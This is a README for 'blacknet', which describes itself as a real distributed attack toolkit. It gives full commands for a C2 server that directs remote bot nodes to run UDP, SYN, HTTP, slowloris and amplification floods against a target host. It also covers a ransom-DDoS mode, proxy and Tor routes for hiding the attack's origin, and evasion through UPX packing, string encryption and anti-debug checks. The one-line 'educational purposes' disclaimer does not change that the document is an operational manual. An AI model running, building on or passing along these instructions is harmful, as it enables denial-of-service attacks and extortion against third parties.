# blacknet

Real distributed attack toolkit. C2 server coordinates remote bot nodes; each bot runs the same binary in `--connect` mode.

 THIS IS FOR EDUCATIONAL PURPOSES ONLY ANY UNAUTHERIZED OR UNETHICAL USE IS ON THE USER NOT DEVELOPER YU HAVE BEEN WARNED
## Quick start

```
# C2 server (main computer)
./blacknet -b -c 0.0.0.0:4444 -m udp -t 100 target.com

# Bot nodes (other computers)
./blacknet --connect 192.168.1.100:4444
```

## Setup

**Dependencies** — requires libcurl, OpenSSL, Qt5Widgets. On Pop OS / Ubuntu:

```
sudo apt install build-essential libcurl4-openssl-dev libssl-dev qtbase5-dev libqt5widgets5
```

**Windows 11** — install WSL2 with Ubuntu, then same commands as above.

**Build:**
```
make
```

## Usage

```
./blacknet --help
```

### C2 server (your main machine)
```
./blacknet -b -c YOUR_IP:4444 -m udp -t 200 -d 60 -r 1000 TARGET_IP
```

### Bot client (each other computer)
```
./blacknet --connect YOUR_C2_IP:4444
```

The bot connects back, registers itself, and waits for commands. When you launch an attack from the C2, all connected bots execute it simultaneously using their own proxy rotation.

### Anonymity (per-bot)
Each bot should load proxies so attack traffic originates from proxy IPs, not the bot's real IP. Edit `resources/proxies.txt` or use:

```
./blacknet --connect C2_IP:4444 -P /path/to/proxies.txt
```

For maximum anonymity, route the C2 connection itself through Tor:

```
sudo apt install tor proxychains
proxychains ./blacknet --connect C2_IP:4444
```

### Available methods
- `udp` — UDP flood
- `tcp` / `syn` — TCP SYN flood (root)
- `ack` — TCP ACK flood (root)
- `tcpconn` — TCP connect flood
- `http` — HTTP GET flood
- `httppost` — HTTP POST flood
- `https` — HTTPS flood
- `icmp` — ICMP flood (root)
- `slowloris` — Slowloris
- `dns` / `ntp` / `mem` / `ssdp` / `snmp` / `mdns` — amplification attacks
- Multi-vector: `udp+http+dns`

### Bot management
```
./blacknet --add-bot 10.0.0.5:4444 --add-bot 10.0.0.6:5555
./blacknet --list-bots
./blacknet --remove-bot <bot-id>
./blacknet --save-bots bots.json
./blacknet --load-bots bots.json
```

### Meta-strategies
```
./blacknet --hit-run 30:10 -m udp -t 100 target.com    # attack 30s, sleep 10s
./blacknet --rdos -m http -t 50 target.com              # ransom note + attack
./blacknet -m "udp+http+dns" -t 200 target.com          # multi-vector
```

## Passcode
Default passcode is `5296`. Change it in `src/main.cpp` — it's now compile-time encrypted (OBF macro).

## Push to GitHub

```bash
# 1. Create a PRIVATE repository on github.com (don't make it public)
# 2. In your repo, go to Settings → Secrets → add BLACKNET_PASSCODE

# 3. From this directory:
git init
git add .
git commit -m "v2.0.1"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/blacknet.git
git push -u origin main

# 4. Create a release tag for auto-update:
git tag 2.0.1
git push --tags
# Then go to GitHub → Releases → create a new release from tag 2.0.1
```


## Verify binary is hardened

```bash
# Check that NO protocol strings appear in plaintext:
strings blacknet | grep -E 'BLACKNET_BOT|BOT_HANDSHAKE|5296' && echo "FAIL" || echo "PASS"

# Confirm it's UPX-packed:
file blacknet  # should say 'packed by UPX'

# Binary is: stripped, UPX-compressed, compile-time XOR string encryption, anti-debug ptrace check
```

## Auto-update
```
sh update.sh
```

Downloads: https://github.com/lolhecks529/blacknet/releases

## Files
```
blacknet          — compiled binary
resources/
  proxies.txt     — one proxy per line (ip:port)
  useragents.txt  — user-agent strings
  subdomains.txt  — subdomains for path randomisation
update.sh         — GitHub release checker
```

## Notes
- TCP SYN, ACK, ICMP require root (CAP_NET_ADMIN)
- Each bot node can load its own proxy list
- Binary is stripped, UPX-packed, and all protocol strings are compile-time XOR-encrypted
- Anti-debug ptrace check on startup
- Passcode prompt on startup
- GUI mode: `./blacknet g` (requires display)
